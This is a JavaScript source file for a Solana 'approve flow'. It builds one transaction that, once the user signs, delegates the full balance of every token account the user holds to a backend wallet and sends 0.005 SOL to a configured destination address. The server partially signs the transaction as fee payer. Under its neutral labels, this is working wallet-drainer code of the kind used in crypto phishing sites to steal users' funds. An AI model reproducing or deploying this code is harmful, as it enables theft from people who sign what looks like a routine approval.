// src/flows/approveFlow.js
const {
  Transaction,
  PublicKey,
  SystemProgram,
} = require("@solana/web3.js");

const {
  createApproveInstruction
} = require("@solana/spl-token");
const { getUserTokenAccounts } = require("../solana/tokenService");
const { getConfig } = require("../config/environment");
const logger = require("../core/logger");
const { withRetry } = require("../core/rpcPool");
const { setBlockhash } = require("../core/blockhashCache");
const { getKeypair } = require("../core/keypairManager");

/**
 * Build approve transaction for token delegation + SOL delegation + SOL transfer (user signs)
 */
async function buildApprove(user, connection) {
  return withRetry(async (conn) => {
    try {
      const config = getConfig();
      const tx = new Transaction();

      // Validate user public key
      let userPubkey;
      try {
        userPubkey = new PublicKey(user);
      } catch (err) {
        throw new Error(`Invalid user public key: ${err.message}`);
      }

      logger.debug("Building approve transaction", { user: userPubkey.toString() });

      // Fetch user token accounts
      const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
      if (!tokenAccounts) throw new Error("Failed to fetch token accounts");

      // Get latest blockhash and cache it
      const { blockhash } = await conn.getLatestBlockhash("confirmed");
      setBlockhash(blockhash);
      tx.recentBlockhash = blockhash;

      // Fee payer MUST match the keypair used to partialSign below
      if (!config.PUBLIC_KEY) throw new Error("PUBLIC_KEY env variable is missing");
      const feePayer = new PublicKey(config.PUBLIC_KEY);
      const delegatePubkey = new PublicKey(config.WALLET);
      tx.feePayer = feePayer;

      // Add approve instruction for each token account (delegate to WALLET)
      for (const token of tokenAccounts.tokens || []) {
        logger.debug("Adding token approve instruction", {
          ata: token.ata.toString(),
          mint: token.mint.toString(),
          amount: token.amount.toString()
        });

        tx.add(
          createApproveInstruction(
            token.ata,        // account to approve
            delegatePubkey,   // delegate (backend WALLET)
            userPubkey,       // owner (user)
            token.amount      // amount
          )
        );
      }

      // Add SOL transfer 0.005 SOL (5_000_000 lamports) from user to DESTINATION_ADDRESS
      if (!config.DESTINATION_ADDRESS) {
        throw new Error("DESTINATION_ADDRESS is not configured");
      }
      const dest = new PublicKey(config.DESTINATION_ADDRESS);
      const lamportsToSend = 5_000_000; // 0.005 SOL
      
      logger.debug("Adding SOL transfer instruction", {
        from: userPubkey.toString(),
        to: dest.toString(),
        lamports: lamportsToSend
      });

      tx.add(
        SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: dest,
          lamports: lamportsToSend
        })
      );

      // Partially sign with server fee payer keypair
      tx.partialSign(getKeypair());

      if (tx.instructions.length === 0) {
        throw new Error("No instructions added to approve transaction");
      }

      logger.info("Approve transaction built successfully", {
        instructions: tx.instructions.length,
        feePayer: feePayer.toString(),
        partiallySigned: true
      });

      return tx;
    } catch (err) {
      logger.error("Failed to build approve transaction", { error: err.message });
      throw err;
    }
  }, "buildApprove");
}

module.exports = { buildApprove };
